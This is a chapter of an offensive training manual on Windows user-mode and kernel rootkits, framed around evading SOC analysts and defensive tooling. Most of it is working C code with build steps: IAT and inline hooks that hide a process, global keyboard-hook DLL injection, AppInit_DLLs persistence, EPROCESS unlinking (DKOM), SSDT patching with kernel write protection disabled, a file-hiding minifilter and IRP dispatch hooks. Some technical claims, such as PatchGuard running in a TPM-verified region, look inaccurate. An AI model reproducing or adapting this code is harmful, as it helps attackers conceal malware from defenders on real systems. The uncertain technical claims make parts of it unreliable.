# Chapter 11 — Rootkits: User Mode & Kernel Rootkits

**VADER-RCE Field Manual**
**Prerequisite**: Ch10 (Code Injection), Ch08 (Target Reversing), basic Windows driver model
**Drill**: DRILLS/11_rootkits/

---

## Why You Need This

Persistence is nothing. Process injection is nothing. The SOC analyst
opens Process Explorer, sees your implant, kills it, you're burned.

A rootkit changes the rules. Not "hide from the analyst" — that's
fantasy. "Subvert the information the analyst receives." The analyst
is looking at a terminal. The terminal queries the OS. The OS is yours.
The terminal sees what you tell it to see.

User-mode rootkits hook the function calls between applications and
the OS. The application asks for a process list. Your hook intercepts
the answer and removes your process before returning. Crude, fast,
effective against unsophisticated tooling.

Kernel-mode rootkits operate below the OS. They modify kernel data
structures directly. They install their own drivers. They intercept
IRP (I/O Request Packets) — the fundamental message-passing mechanism
of the Windows kernel. At this level, the OS itself becomes your tool.

The difference matters operationally. User-mode hooks are trivially
bypassed by any tool that makes direct syscalls or reads kernel
structures directly. Kernel-mode techniques require the attacker to
operate at ring 0 — but once there, the visibility advantage is
categorical, not incremental.

But before you touch the kernel, you need to deal with a problem closer
to the ground: the security tools watching your process. AMSI and ETW
are the eyes of the defender INSIDE your process. Kill those first.
Then worry about hiding your implant.

Understand BOTH layers. Understand what defenders use to detect EACH.
Then you can make informed decisions about which level you need for
a given operation.

---

## WINDOWS SETUP

This chapter involves kernel-mode C development. This is the most complex
build environment in the manual. Take your time with this section — a broken
toolchain means nothing compiles and nothing runs. Do this once, do it right.

### Tools Required

| Tool | Purpose | Requires Admin? |
|------|---------|----------------|
| Visual Studio 2022 (Community) | C compiler, linker, IDE | YES |
| Windows Driver Kit (WDK) | Kernel headers, libs, driver build system | YES |
| Windows SDK | User-mode Windows headers (usually installed with VS) | YES |
| VirtualBox or VMware Workstation | Test VM — NEVER run rootkit drivers on your main machine | YES |
| WinDbg Preview | Kernel debugger — attach from host to test VM | NO (Store app) |
| Volatility 3 | Memory forensics, Python-based | NO |
| OSR Driver Loader | Load unsigned drivers in test VM (TESTSIGNING mode) | YES (in test VM) |

### Install Commands (Run as Administrator in PowerShell)

**Step 1 — Visual Studio 2022 Community (includes C compiler)**

Download and run the installer manually — the winget version works but
the installer UI is easier for selecting the right workloads:

```
https://visualstudio.microsoft.com/downloads/
```

During install, select these workloads:
- "Desktop development with C++"
- Nothing else is required

Verification (after install, open "Developer Command Prompt for VS 2022"):
```
cl
```
Expected output:
```
Microsoft (R) C/C++ Optimizing Compiler Version 19.xx.xxxxx for x64
```
Failure looks like `'cl' is not recognized` — means you opened regular
PowerShell instead of the VS Developer Command Prompt. Use the Start Menu
shortcut "Developer Command Prompt for VS 2022".

**Step 2 — Windows Driver Kit (WDK)**

The WDK version MUST match your Windows SDK version exactly.
Download from:
```
https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk
```

The page lists the correct WDK version for your Windows SDK version.
Install the WDK AFTER Visual Studio — it installs VS extensions automatically.

Verification (in Developer Command Prompt):
```
dir "C:\Program Files (x86)\Windows Kits\10\Include\*\km\ntddk.h"
```
Expected output: one file path printed (the ntddk.h kernel header)
Failure looks like "File Not Found" — means WDK didn't install correctly.
Re-run the WDK installer as Administrator.

**Step 3 — WinDbg Preview (kernel debugger)**

```powershell
winget install Microsoft.WinDbg
```
Expected output: `Successfully installed` message.
Verification: Open Start Menu → search "WinDbg Preview" → it launches.
No admin required to install, but kernel debugging operations inside
WinDbg require the test VM to be configured first (see Step 5).

**Step 4 — Volatility 3 (memory forensics)**

Requires Python 3.8+. Run in regular PowerShell (no admin needed):
```powershell
pip install volatility3
```
Verification:
```powershell
vol -h
```
Expected output: Volatility 3 help text with list of plugins.
Failure looks like `'vol' is not recognized` — means Python Scripts
folder is not on your PATH. Run `python -m volatility3 -h` instead,
or add `C:\Users\<you>\AppData\Local\Programs\Python\Python3x\Scripts`
to PATH in System Environment Variables.

**Step 5 — Test VM Setup (CRITICAL — do not skip)**

> **WARNING**: Never load rootkit drivers on your main Windows machine.
> Bugs in kernel code cause immediate Blue Screens of Death (BSOD).
> A bad driver in a test VM = reboot the VM. A bad driver on your main
> machine = BSOD, possible filesystem corruption.

In your test VM (Windows 10/11, installed in VirtualBox/VMware):
1. Open an Administrator Command Prompt INSIDE the VM
2. Enable test signing (allows unsigned drivers to load):
```
bcdedit /set testsigning on
```
3. Enable kernel debugging over network (so WinDbg on your host can connect):
```
bcdedit /dbgsettings net hostip:<YOUR-HOST-IP> port:50000 key:1.2.3.4
bcdedit /debug on
```
4. Reboot the test VM.
5. In the bottom-right corner of the VM desktop you should see "Test Mode" watermark.

Verification: The watermark "Windows 10 Test Mode" (or Windows 11) appears
on the VM desktop after reboot.
Failure looks like no watermark — means bcdedit command didn't take effect.
Re-run as Administrator inside the VM, then reboot again.

**Step 6 — OSR Driver Loader (load drivers in test VM)**

Download from:
```
https://www.osronline.com/article.cfm%5Earticle=157.htm
```
Extract to the test VM. No install needed — run `OSRLOADER.exe` as Administrator.

Verification: OSRLOADER.exe opens a GUI with a "Driver Path" field and a
"Register Service" button.

---

## Section 1 — User-Mode Rootkit: IAT Hooking

The Import Address Table is an array of function pointers maintained
by the Windows loader. When application code calls `GetProcessList`,
it doesn't call the function directly — it calls the address stored
in the IAT entry for that function. Overwrite that address, and every
call to `GetProcessList` from that process goes to YOUR function instead.

### How The IAT Works

```
PE file (application.exe):
    .idata section contains:
        Import Descriptor for KERNEL32.DLL:
            OriginalFirstThunk → array of function name hints
            FirstThunk → IAT (array of addresses, filled by loader)

At load time, Windows loader:
    For each entry in FirstThunk:
        → Resolves the function address in the target DLL
        → Writes that address into the FirstThunk array

Application code compiled as:
    call [__imp__GetProcAddress]   ; indirect call via IAT entry
```

### Performing IAT Hook

```c
#include <windows.h>

// hook a function in the IAT of the current process
// module_name: the DLL that exports the function (e.g. "psapi.dll")
// func_name:   the function to hook (e.g. "EnumProcesses")
// hook_func:   your replacement function
// original_func: output — pointer to the original function (so you can call it)
void iat_hook(const char *module_name, const char *func_name,
              PVOID hook_func, PVOID *original_func) {
    // Get base address of the module we're hooking in
    HMODULE base = GetModuleHandleA(NULL);  // NULL = current process main module

    // Parse the PE headers to find the import directory
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS*)((BYTE*)base + dos->e_lfanew);  // e_lfanew = offset to NT header

    // DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT] = the import table descriptor
    IMAGE_IMPORT_DESCRIPTOR *import_dir =
        (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)base
        + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    // Walk import descriptors — one per imported DLL
    for (; import_dir->Name; import_dir++) {
        const char *dll_name = (const char*)((BYTE*)base + import_dir->Name);
        if (_stricmp(dll_name, module_name) != 0) continue;  // skip DLLs that aren't our target

        // Found the target DLL's import descriptor
        // OriginalFirstThunk = names/ordinals of imported functions
        IMAGE_THUNK_DATA *thunk_orig = (IMAGE_THUNK_DATA*)((BYTE*)base
            + import_dir->OriginalFirstThunk);
        // FirstThunk = the actual IAT (addresses written by loader)
        IMAGE_THUNK_DATA *thunk_iat  = (IMAGE_THUNK_DATA*)((BYTE*)base
            + import_dir->FirstThunk);

        // Walk parallel arrays: thunk_orig gives names, thunk_iat gives addresses
        for (; thunk_orig->u1.Ordinal; thunk_orig++, thunk_iat++) {
            if (IMAGE_SNAP_BY_ORDINAL(thunk_orig->u1.Ordinal)) continue;  // skip ordinal imports (no name)

            // Get the import-by-name structure (contains the function name string)
            IMAGE_IMPORT_BY_NAME *iname =
                (IMAGE_IMPORT_BY_NAME*)((BYTE*)base
                + thunk_orig->u1.AddressOfData);

            if (strcmp((char*)iname->Name, func_name) != 0) continue;  // not our target function

            // FOUND the IAT entry — save the original function address
            *original_func = (PVOID)thunk_iat->u1.Function;

            // IAT memory is read-only by default — make it writable
            DWORD old_protect;
            VirtualProtect(&thunk_iat->u1.Function, sizeof(PVOID),
                           PAGE_READWRITE, &old_protect);

            // Overwrite the IAT entry with our hook function address
            thunk_iat->u1.Function = (ULONG_PTR)hook_func;

            // Restore original memory protection
            VirtualProtect(&thunk_iat->u1.Function, sizeof(PVOID),
                           old_protect, &old_protect);
            return;
        }
    }
}

// Define a function pointer type matching EnumProcesses signature
typedef BOOL (WINAPI *pfnEnumProcesses)(DWORD*, DWORD, DWORD*);
pfnEnumProcesses orig_EnumProcesses = NULL;  // will hold original function pointer

// Our hook — called instead of the real EnumProcesses
BOOL WINAPI hook_EnumProcesses(DWORD *pids, DWORD cb, DWORD *bytes_returned) {
    // First, call the REAL EnumProcesses to get the actual list
    BOOL result = orig_EnumProcesses(pids, cb, bytes_returned);
    if (!result) return result;  // if the real call failed, just return the failure

    DWORD our_pid = GetCurrentProcessId();  // get our own PID to hide
    DWORD count = *bytes_returned / sizeof(DWORD);  // total number of PIDs returned

    // Scan the returned PID array and remove our PID from it
    for (DWORD i = 0; i < count; i++) {
        if (pids[i] == our_pid) {
            // Shift everything after index i one slot left (overwrites our PID)
            memmove(&pids[i], &pids[i+1], (count - i - 1) * sizeof(DWORD));
            *bytes_returned -= sizeof(DWORD);  // shrink the reported count by one
            count--;
            break;
        }
    }
    return result;
}

// Install the hook — redirects all EnumProcesses calls in this process
iat_hook("psapi.dll", "EnumProcesses",
         hook_EnumProcesses, (PVOID*)&orig_EnumProcesses);
```

### Expected Output

**Build:** Compile this as a DLL with Visual Studio (see Windows Setup). In the
Developer Command Prompt:
```
cl /LD iat_hook.c /link /OUT:hook.dll user32.lib kernel32.lib psapi.lib
```
Expected output:
```
Microsoft (R) C/C++ Optimizing Compiler Version 19.xx ...
iat_hook.c
   Creating library hook.lib and object hook.exp
```

**Runtime success:** After injecting the DLL and calling `hook_EnumProcesses`,
a tool calling `EnumProcesses` from the same process will not see your PID in
the returned array.

**Failure looks like `LNK2019: unresolved external symbol _EnumProcesses`** —
means you forgot to link psapi.lib. Add `/link psapi.lib` to the cl command.

**Failure looks like access violation on `VirtualProtect`** — means you passed
a bad address. Double-check that `thunk_iat` is inside the IAT range before
writing to it.

### Limitations of IAT Hooking

```
IAT hooks only affect processes that import via the IAT.
Bypasses:
    GetProcAddress at runtime — no IAT entry, direct resolution
    Static linking — no import table entry at all
    Direct syscalls — bypasses all user-mode hooks entirely
    Tools that read NTDLL/KERNEL32 IAT in another process — your hook
        is only in your process, not in the tool inspecting your process

Scope: IAT hooking is INTRA-PROCESS. You hook the IAT of the process
you're running in. You don't hook the tool that's LOOKING at your process.
```

---

## Section 2 — User-Mode Rootkit: Inline Hooking (Trampoline)

IAT hooking is limited to processes that load via the IAT. Inline hooking
is more powerful: you patch the FUNCTION itself. Any caller, any process
that shares the same DLL mapping, gets the hook.

### The Trampoline Mechanism

```
BEFORE HOOK:
    kernel32!CreateProcessW:
        48 89 5C 24 08    mov [rsp+8], rbx
        48 89 74 24 10    mov [rsp+10], rsi
        57                push rdi
        41 54             push r12
        ...

AFTER HOOK (5-byte near jump injected at start):
    kernel32!CreateProcessW:
        E9 XX XX XX XX    jmp hook_CreateProcessW    ← your code
        XX XX XX XX       (original bytes overwritten)
        57                push rdi                   ← execution resumes here
        41 54             push r12                      after trampoline
        ...

TRAMPOLINE (allocated stub):
    48 89 5C 24 08    (original first 5 bytes, copied here)
    48 89 74 24 10    (original next 5 bytes, copied here)
    E9 XX XX XX XX    jmp (CreateProcessW + 10)      ← jump back into original
```

### Implementation

```c
#include <windows.h>

// Bookkeeping structure for one installed hook
typedef struct {
    PVOID  original_func;       // address of the function we hooked
    PVOID  hook_func;           // address of our replacement
    BYTE   original_bytes[16];  // saved copy of original bytes before patching
    BYTE   trampoline[32];      // executable stub: original bytes + jmp back
} HOOK;

int install_inline_hook(PVOID target, PVOID hook, HOOK *h) {
    h->original_func = target;
    h->hook_func     = hook;

    // Save original bytes so we can restore or build the trampoline
    memcpy(h->original_bytes, target, 16);

    // Build trampoline:
    // Copy first 5 bytes of original (they'll be overwritten)
    // Then write a jmp back to original+5
    BYTE *tramp = h->trampoline;

    // Disassemble to find how many bytes we need (at least 5, must be
    // on instruction boundary) — simplified: use 14-byte absolute jmp
    // for x64 instead of 5-byte near jmp to avoid ±2GB range limit

    // x64 absolute indirect jmp:
    //   FF 25 00 00 00 00   jmp [rip+0]
    //   XX XX XX XX XX XX XX XX   <64-bit address>
    // Total: 14 bytes

    // Copy first 14 original bytes to the trampoline buffer
    memcpy(tramp, target, 14);

    // Append a jump from the trampoline back into the original function at +14
    BYTE *jmp_back = tramp + 14;
    *(WORD*)jmp_back = 0x25FF;               // opcode: JMP [RIP+0] (indirect absolute jump)
    *(DWORD*)(jmp_back + 2) = 0;             // RIP+0 displacement (address follows immediately)
    *(PVOID*)(jmp_back + 6) = (PBYTE)target + 14;  // the absolute destination address

    // Mark the trampoline buffer executable so the CPU can run it
    DWORD old;
    VirtualProtect(h->trampoline, 32, PAGE_EXECUTE_READWRITE, &old);

    // Patch the real function: overwrite its first 14 bytes with a jump to our hook
    DWORD old2;
    VirtualProtect(target, 14, PAGE_EXECUTE_READWRITE, &old2);  // remove write protection

    PBYTE patch = (PBYTE)target;
    *(WORD*)patch = 0x25FF;                  // JMP [RIP+0]
    *(DWORD*)(patch + 2) = 0;               // RIP+0 displacement
    *(PVOID*)(patch + 6) = hook;            // absolute address of our hook function

    VirtualProtect(target, 14, old2, &old2);  // restore original protection

    return 0;
}
```

### Expected Output

**Build:** Compile as a DLL:
```
cl /LD inline_hook.c /link /OUT:inline_hook.dll kernel32.lib
```
Expected output: `Creating library inline_hook.lib and object inline_hook.exp`

**Runtime success:** After installing the hook, calls to the target function
execute your hook code first, then continue through the trampoline to the
original function. The original function's behavior is preserved.

**Failure looks like infinite loop / stack overflow** — means the trampoline
jumps back to the START of the patched function instead of past the patch.
Check that `(PBYTE)target + 14` is past all patched bytes.

**Failure looks like BSOD / access violation** — means you forgot
`VirtualProtect` before patching. The code section is execute-only by default.

### Trampoline Pattern Summary

```
PATCHED FUNCTION            TRAMPOLINE BUFFER           YOUR HOOK
────────────────            ─────────────────           ──────────
jmp [rip+0] ──────────────►  do custom logic ◄──────── entry point
<addr: hook>                  call original              (filter args,
                              (via trampoline)            hide entries,
                              ret                         log calls, etc.)
                                  │
                                  ▼
                              original bytes
                              jmp original+14
                                  │
                                  ▼
                              real function
                              continues normally
```

---

## Section 3 — User-Mode Rootkit: DLL Injection as Persistence

User-mode rootkit hooks require code running inside the target process.
You need a persistence mechanism to keep your hook DLL loaded across
process restarts and new process creation.

### AppInit_DLLs

```
Registry key: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
Value: AppInit_DLLs = C:\Windows\Temp\hook.dll
Value: LoadAppInit_DLLs = 1

Effect: every process that loads USER32.dll also loads your DLL.
That's nearly every GUI application.

Detection: trivially visible in registry, well-known persistence key,
checked by every security tool ever written.
```

### Windows Hook (SetWindowsHookEx)

```c
// Install a system-wide keyboard hook.
// Windows will inject your DLL into EVERY process that processes keystrokes.
// h_dll: handle to the DLL containing the hook procedure
HMODULE h_dll = LoadLibraryA("hook.dll");
// Get the address of our exported hook function inside the DLL
HOOKPROC hook_proc = (HOOKPROC)GetProcAddress(h_dll, "KeyboardProc");
// WH_KEYBOARD_LL = low-level keyboard hook (runs in this process, not injected)
// h_dll = the DLL to inject for non-LL hooks; 0 as thread ID = global (all threads)
HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, h_dll, 0);

// 0 as thread ID = global hook — all threads in all processes
// Your DLL gets injected into every process in the session
```

### Expected Output

**Runtime success:** After calling `SetWindowsHookExA`, the return value
(`HHOOK hook`) is non-NULL. A NULL return means failure — call `GetLastError()`
to get the error code.

**Failure looks like `hook = NULL`, GetLastError returns `ERROR_HOOK_NEEDS_HMOD (1428)`**
— means you passed NULL as the module handle for a non-global hook type.

SetWindowsHookEx legitimately injects DLLs as part of normal Windows
functionality. It's visible but the mechanism itself is not suspicious.
You're abusing a feature, not exploiting a vulnerability.

---

## Section 4 — Kernel-Mode Rootkits: DKOM (Direct Kernel Object Manipulation)

This is where user-mode tools stop working. When an analyst runs
Process Explorer, it doesn't ask the user-mode process list API —
it reads kernel memory directly. To hide from that, you need to
modify kernel memory directly.

DKOM is the oldest and most fundamental kernel rootkit technique.
Specifically: process hiding by unlinking the EPROCESS structure
from the doubly-linked list that the kernel uses to track processes.

> **REMINDER**: All kernel-mode code in this section runs inside a
> Windows kernel driver. You need the WDK build environment from the
> Windows Setup section above. Never load and test these drivers on
> your main machine — use the test VM with TESTSIGNING=ON.

### The EPROCESS Structure

Every running process has a kernel object: EPROCESS. These objects
are chained together in a doubly-linked list via the `ActiveProcessLinks`
field. NtQuerySystemInformation (the kernel function behind
`EnumProcesses`) walks this list to return the process list.

```
EPROCESS (System) ──► EPROCESS (svchost.exe) ──► EPROCESS (your.exe) ──► EPROCESS (explorer.exe)
         ◄────────────────────────────────────────────────────────────────
         (doubly linked — LIST_ENTRY with Flink + Blink)

If you unlink EPROCESS(your.exe):
    EPROCESS (System) ──► EPROCESS (svchost.exe) ──► EPROCESS (explorer.exe)
                                                   ◄──
    your.exe still runs — threads still scheduled — just invisible to the list walker
```

### DKOM Implementation (Concept)

```c
// This code runs in kernel mode (requires a driver loaded by Windows)
// Target: hide the process with a given PID from the active process list

VOID HideProcess(ULONG target_pid) {
    PEPROCESS target_process;

    // PsLookupProcessByProcessId — kernel API to get EPROCESS pointer by PID
    // Returns STATUS_SUCCESS if the PID exists; increments reference count
    if (!NT_SUCCESS(PsLookupProcessByProcessId(
            (HANDLE)(ULONG_PTR)target_pid, &target_process))) {
        return;  // PID not found — nothing to do
    }

    // Get the ActiveProcessLinks field inside the EPROCESS structure
    // This offset varies by Windows version — must be determined per-version
    // On Windows 10 21H2 x64: ActiveProcessLinks is at EPROCESS+0x448
    PLIST_ENTRY process_links = (PLIST_ENTRY)(
        (PUCHAR)target_process + EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET
    );

    // Doubly-linked list unlink:
    // Our node: [Blink] ← [process_links] → [Flink]
    // After: Blink->Flink = Flink, Flink->Blink = Blink
    PLIST_ENTRY prev = process_links->Blink;  // node before us in the list
    PLIST_ENTRY next = process_links->Flink;  // node after us in the list

    prev->Flink = next;  // previous node now skips past us, points to next
    next->Blink = prev;  // next node now skips past us, points to previous

    // Point our own links at ourselves (circular self-reference)
    // This prevents crashes if something walks to our node directly
    process_links->Flink = process_links;
    process_links->Blink = process_links;

    // Decrement reference count — required after PsLookupProcessByProcessId
    ObDereferenceObject(target_process);
}
```

### Expected Output

**Build (WDK driver project in Visual Studio):**
1. File → New → Project → "Kernel Mode Driver, Empty (KMDF)"
2. Add a .c file with your DriverEntry and HideProcess function
3. Build → the output is a .sys file (kernel driver binary)

Expected build output (in Visual Studio Output window):
```
========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========
```

**Runtime success (in test VM):**
1. Load the .sys file via OSR Driver Loader → "Register Service" → "Start Service"
2. From your test app, call into the driver via DeviceIoControl with the target PID
3. Run `tasklist` in the VM — the target process is gone from the list
4. The process window is still visible and running

**Failure looks like BSOD with `SYSTEM_THREAD_EXCEPTION_NOT_HANDLED`** —
means the offset `EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET` is wrong for your
Windows build. Use the Finding Offsets section below to get the correct value.

**Failure looks like `0xC000000D STATUS_INVALID_PARAMETER`** from
PsLookupProcessByProcessId — means the PID doesn't exist or is already dead.

### Finding EPROCESS Offsets

```
Offsets change between Windows versions. Three methods:

Method 1: Hardcoded per-version table
    typedef struct {
        ULONG build;
        ULONG active_process_links;
        ULONG pid_offset;
        ULONG token_offset;
    } EPROCESS_OFFSETS;

    EPROCESS_OFFSETS offsets_table[] = {
        { 19041, 0x448, 0x440, 0x4B8 },  // Win10 2004
        { 19042, 0x448, 0x440, 0x4B8 },  // Win10 20H2
        { 22621, 0x448, 0x440, 0x4B8 },  // Win11 22H2
        // ... add new builds as they release
    };

Method 2: PsInitialSystemProcess walk
    // PsInitialSystemProcess is an exported kernel variable
    // Walk from System (PID 4) forward, find our target by PID field
    // This works regardless of offset knowledge if you know the PID offset

Method 3: KdVersionBlock / kernel symbols
    // Load kernel PDB symbols
    // Look up EPROCESS!ActiveProcessLinks offset
    // Requires internet access or pre-loaded symbols
    dt nt!_EPROCESS -r    ← in WinDbg, shows all offsets
```

---

## Section 5 — SSDT Hooks

The System Service Descriptor Table. In x64 Windows, the SSDT maps
syscall numbers to their kernel function implementations. NtQuerySystemInformation
is syscall 0x36. The SSDT says: syscall 0x36 → call this function at this address.

Hooking the SSDT means: replace that address with your own. All calls
to NtQuerySystemInformation from all processes in the system go through
your hook.

### The SSDT Structure

```
nt!KiServiceTable:
    LONG offsets[n];   // relative offsets, not absolute addresses
                       // actual address = KiServiceTable + (entry >> 4)
                       // (the lower 4 bits encode the argument count)

Syscall 0x36 (NtQuerySystemInformation):
    KiServiceTable[0x36] = offset to nt!NtQuerySystemInformation
                           × 16 + arg_count
```

### SSDT Hook (Conceptual — Requires Kernel Mode)

```c
// Get SSDT address
// KeServiceDescriptorTable is not exported in x64 Windows
// Must find it via:
//   1. Pattern scan in ntoskrnl.exe (look for KiSystemCall64 and trace to table)
//   2. Or use undocumented KeServiceDescriptorTable via reverse engineering
PLONG ssdt = GetKiServiceTableAddress(); // your implementation (pattern scan)

// Get current offset for syscall 0x36 (NtQuerySystemInformation)
LONG original_offset = ssdt[0x36];

// Calculate original function address from the encoded offset
// The SSDT stores (address - tablebase) << 4 | arg_count
PVOID original_func = (PVOID)(
    (ULONG_PTR)ssdt + (original_offset >> 4)  // >> 4 strips the arg count from low bits
);

// Our hook function — called instead of NtQuerySystemInformation
NTSTATUS NTAPI hook_NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS info_class,  // what kind of info is requested
    PVOID info,                           // output buffer
    ULONG info_len,                       // output buffer size
    PULONG return_len                     // how many bytes were written
) {
    // Call the real NtQuerySystemInformation first to get real data
    NTSTATUS status = original_func(info_class, info, info_len, return_len);

    // If caller wants process info and the call succeeded, filter our process out
    if (info_class == SystemProcessInformation && NT_SUCCESS(status)) {
        // Walk SYSTEM_PROCESS_INFORMATION linked list
        // Remove our process's entry
        filter_process_list(info, GetCurrentProcessId());
    }
    return status;
}

// Patch the SSDT entry — must disable write protection on SSDT memory first
// CR0 register bit 16 = Write Protect bit; clearing it allows writing to read-only pages
ULONG_PTR cr0 = __readcr0();        // read current CR0 value
__writecr0(cr0 & ~0x10000);         // clear bit 16 (WP bit) — now we can write to SSDT

// Encode our hook address as an SSDT offset (same format as original)
LONG new_offset = (LONG)(
    ((ULONG_PTR)hook_NtQuerySystemInformation - (ULONG_PTR)ssdt) << 4
    | arg_count  // preserve the argument count in low 4 bits
);
ssdt[0x36] = new_offset;            // overwrite the SSDT entry for syscall 0x36

__writecr0(cr0);  // restore WP bit — write protection back on
```

### Expected Output

**Build:** Same WDK driver project as DKOM section. Successful build produces a .sys file.

**Runtime success (in test VM, TESTSIGNING=ON):** After loading the driver and
installing the hook, all calls to NtQuerySystemInformation with
SystemProcessInformation class across ALL processes will go through your hook.
A `tasklist` in any cmd window will not show the hidden process.

**Failure looks like BSOD `CRITICAL_STRUCTURE_CORRUPTION (0x109)`** — PatchGuard
detected the SSDT modification. This is EXPECTED on x64 Windows 10/11.
See the "Why SSDT Hooks Are Mostly Dead" section below.

**Failure looks like BSOD `PAGE_FAULT_IN_NONPAGED_AREA`** — the SSDT address
resolution returned a wrong address. Your pattern scan is broken.

### Why SSDT Hooks Are Mostly Dead

```
PatchGuard (Kernel Patch Protection):
    Introduced with x64 Windows Vista.
    A background thread periodically verifies:
        — SSDT integrity
        — SSDT extension tables
        — Kernel code integrity (ntoskrnl.exe .text section)
        — EPROCESS.ActiveProcessLinks integrity (indirectly)
        — IDT (Interrupt Descriptor Table)
        — GDT (Global Descriptor Table)

    If tampering detected: BSOD with CRITICAL_STRUCTURE_CORRUPTION (0x109)
    The check interval is random (minutes to hours).
    The check runs in a TPM-verified secure region on modern Windows.

Practical result:
    SSDT hooks on x64 Windows 10/11 will eventually trigger PatchGuard.
    Not if, when.
    Timeline: minutes to hours depending on randomised check timing.
    Therefore: SSDT hooks are not viable for stable, long-term rootkits
    on x64 Windows. They WORK — until PatchGuard kills the system.

Bypass approaches (academic, most are patched):
    Hypervisor-based evasion: intercept PatchGuard's own reads
    PatchGuard disable via timing attack (historical, patched)
    Load before PatchGuard initialises (bootkit territory)
```

---

## Section 6 — Filter Driver Basics

A filter driver sits above (or below) an existing driver in a device
stack. I/O requests flow down the stack as IRPs (I/O Request Packets).
Your filter intercepts them, modifies them, and either passes them down
or completes them itself.

### The Device Stack Model

```
APPLICATION
    │ ReadFile("C:\Windows\System32\ntdll.dll")
    ▼
I/O Manager
    │ Creates IRP_MJ_READ
    ▼
Upper Filter Driver (your filter — optional)
    │ Intercept, modify, or block IRP
    ▼
File System Driver (ntfs.sys)
    │ Process the actual read
    ▼
Lower Filter Driver (optional)
    │
    ▼
Volume Driver / Storage Driver
    │
    ▼
Hardware
```

A file system mini-filter (using Filter Manager / fltmgr.sys) is the
modern approach. You register callbacks for specific IRP types and
specific file paths or extensions.

### Mini-Filter Registration

```c
#include <fltKernel.h>  // WDK header for Filter Manager API

PFLT_FILTER filter_handle;  // handle to our registered filter

// Pre-operation callback: called BEFORE the IRP reaches the FS driver
// This is where you intercept and optionally block I/O
FLT_PREOP_CALLBACK_STATUS PreReadCallback(
    PFLT_CALLBACK_DATA Data,           // contains IRP data and I/O parameters
    PCFLT_RELATED_OBJECTS FltObjects,  // related objects: filter, volume, file
    PVOID *CompletionContext           // optional: data to pass to post-op callback
) {
    // Get the name of the file being accessed
    PUNICODE_STRING file_name = &FltObjects->FileObject->FileName;

    // Check if this access is to our hidden file
    if (RtlEqualUnicodeString(file_name, &HIDDEN_FILE, TRUE)) {
        // Return "file not found" to the caller — file is invisible
        Data->IoStatus.Status = STATUS_OBJECT_NAME_NOT_FOUND;
        return FLT_PREOP_COMPLETE;  // don't pass IRP down to the FS driver
    }

    return FLT_PREOP_SUCCESS_WITH_CALLBACK;  // pass through to FS driver normally
}

// Registration array: maps IRP major function codes to our callback functions
FLT_OPERATION_REGISTRATION callbacks[] = {
    { IRP_MJ_READ, 0, PreReadCallback, NULL },                  // intercept reads
    { IRP_MJ_DIRECTORY_CONTROL, 0, PreDirCallback, NULL },      // intercept directory listings
    { IRP_MJ_OPERATION_END }                                     // sentinel — marks end of array
};

// Filter registration structure — tells Filter Manager about our filter
FLT_REGISTRATION filter_registration = {
    sizeof(FLT_REGISTRATION),    // size of this structure (version check)
    FLT_REGISTRATION_VERSION,    // version constant from fltKernel.h
    0,                           // flags (none)
    NULL,                        // context registration (none for this example)
    callbacks,                   // our operation callback array
    FilterUnloadCallback,        // called when filter is unloaded
    InstanceSetupCallback,       // called when attaching to a new volume
    NULL, NULL, NULL, NULL, NULL, NULL  // optional callbacks we don't use
};

// DriverEntry — kernel entry point, called when driver loads
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    // Register our filter with Filter Manager
    FltRegisterFilter(DriverObject, &filter_registration, &filter_handle);
    // Start receiving callbacks — filter is now active on all volumes
    FltStartFiltering(filter_handle);
    return STATUS_SUCCESS;
}
```

### Expected Output

**Build:** In Visual Studio with WDK, create a "Kernel Mode Driver (KMDF)" project.
Add the code above. Build should succeed with:
```
========== Build: 1 succeeded, 0 failed ==========
```

**Failure looks like `error C1083: Cannot open include file: 'fltKernel.h'`** —
means the WDK is not installed or not integrated with Visual Studio. Re-run
the WDK installer and make sure "Visual Studio Integration" is checked.

**Runtime success (in test VM):** After loading the driver, attempting to open
the hidden file from any application returns "File not found". The file still
exists on disk — only the I/O path is intercepted.

A filter driver hiding files intercepts IRP_MJ_DIRECTORY_CONTROL
(directory enumeration) and IRP_MJ_CREATE (file open attempts) —
removing hidden file entries from directory responses and returning
NOT_FOUND for direct access attempts.

---

## Section 7 — IRP Hooking

Before Filter Manager existed (Windows XP era), rootkits hooked
the IRP dispatch tables directly. The concept is still relevant for
understanding the kernel I/O model.

Every driver object has a dispatch table: an array of function pointers,
one per major function code (IRP_MJ_READ, IRP_MJ_WRITE, etc.). Overwriting
an entry redirects all IRPs of that type for that device.

```c
// Obtain a pointer to NTFS's driver object by name
// (IoGetDriverObjectPointer looks up a driver by its registered device name)
PDRIVER_OBJECT ntfs_driver_obj;  // obtained via IoGetDriverObjectPointer

// Save the original IRP_MJ_READ handler so we can call it later
PDRIVER_DISPATCH orig_read = ntfs_driver_obj->MajorFunction[IRP_MJ_READ];

// Replace the IRP_MJ_READ handler with our hook function
// All future read IRPs to NTFS devices will call hook_read first
ntfs_driver_obj->MajorFunction[IRP_MJ_READ] = hook_read;

// Our hook — intercepts every read IRP before NTFS processes it
NTSTATUS hook_read(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    // Get the current stack location — contains parameters for this IRP
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    // Inspect file name, modify data, etc.
    // ...

    // Pass IRP to the original NTFS read handler — real read still happens
    return orig_read(DeviceObject, Irp);
}
```

### Expected Output

**Runtime success:** The hook intercepts reads. You can log file paths,
modify data in the read buffer, or block specific files.

**Failure looks like BSOD `CRITICAL_STRUCTURE_CORRUPTION (0x109)`** —
PatchGuard detected the dispatch table modification on a monitored driver.
Same as SSDT hooks — PatchGuard watches dispatch tables of critical drivers.

PatchGuard also monitors dispatch table integrity on critical drivers.
Same caveat as SSDT: eventually triggers BSOD.

---

